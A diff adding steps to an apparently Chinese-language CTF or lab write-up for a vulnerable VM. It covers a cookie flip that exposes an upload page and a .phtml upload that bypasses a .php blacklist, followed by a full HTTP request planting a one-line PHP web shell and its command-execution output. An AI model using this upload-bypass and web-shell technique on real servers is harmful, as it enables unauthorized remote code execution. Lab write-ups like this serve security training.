@@ -84,3 +84,36 @@ false
 
 综上所述，把false改成true编码后`dHJ1ZQ==`，就会出现文件上传的入口
 http://192.168.44.137/5df03f95b4ff4f4b5dabe53a5a1e15d7.php
+burp抓包,这里后端使用黑名单限制了php后缀的上传，尝试使用phtml后缀被解析成功。
+
+```
+POST /5df03f95b4ff4f4b5dabe53a5a1e15d7.php HTTP/1.1
+Host: 192.168.44.137
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------30594177056923721121592264423
+Content-Length: 379
+Origin: http://192.168.44.137
+Connection: close
+Referer: http://192.168.44.137/5df03f95b4ff4f4b5dabe53a5a1e15d7.php
+Cookie: RW5hYmxlVXBsb2FkZXIK=dHJ1ZQ==
+Upgrade-Insecure-Requests: 1
+
+-----------------------------30594177056923721121592264423
+Content-Disposition: form-data; name="fileToUpload"; filename="logo.phtml"
+Content-Type: image/png
+<?php system($_GET['cmd']);?>
+-----------------------------30594177056923721121592264423
+Content-Disposition: form-data; name="submit"
+
+Upload Image
+-----------------------------30594177056923721121592264423--
+```
+
+命令执行
+```c
+http://192.168.44.137/assets/img/1.phtml?cmd=id
+uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+```
